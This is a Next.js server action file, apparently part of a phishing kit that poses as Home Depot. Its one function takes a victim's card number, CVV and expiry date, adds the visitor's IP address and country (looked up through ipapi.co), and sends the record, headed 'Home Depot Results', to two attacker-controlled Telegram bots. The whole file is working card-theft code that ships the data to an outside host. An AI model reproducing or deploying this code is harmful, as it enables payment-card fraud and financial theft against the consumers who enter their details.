"use server"

import { headers } from "next/headers"

export async function sendToTelegram(data: { cardNumber: string; cvv: string; expiryDate: string }) {
  try {
    // First Telegram bot
    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    // Second Telegram bot
    const botToken2 = process.env.TELEGRAM_BOT_TOKEN2
    const chatId2 = process.env.TELEGRAM_CHAT_ID2

    // Get IP address and geolocation
    const headersList = headers()
    const forwardedFor = headersList.get("x-forwarded-for")
    const ipAddress = forwardedFor ? forwardedFor.split(",")[0].trim() : headersList.get("x-real-ip") || "Unknown"

    let country = "Unknown"
    try {
      const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`)
      if (geoResponse.ok) {
        const geoData = await geoResponse.json()
        country = geoData.country_name || "Unknown"
      }
    } catch (geoError) {
      console.error("Error fetching geolocation:", geoError)
    }

    const message = `
🔔 Home Depot Results:
💳 Card Number: ${data.cardNumber}
🔑 CVV: ${data.cvv}
📅 Expiry Date: ${data.expiryDate}
📅 Submission Date: ${new Date().toLocaleString()}
📱 Device: ${typeof window !== "undefined" ? window.navigator.userAgent : "Unknown"}
🌍 IP Address: ${ipAddress}
🗺️ Country: ${country}
    `

    // Send to first Telegram bot
    if (botToken && chatId) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      })
    }

    // Send to second Telegram bot
    if (botToken2 && chatId2) {
      await fetch(`https://api.telegram.org/bot${botToken2}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId2,
          text: message,
          parse_mode: "HTML",
        }),
      })
    }

    return { success: true }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, error: "Failed to send data" }
  }
}
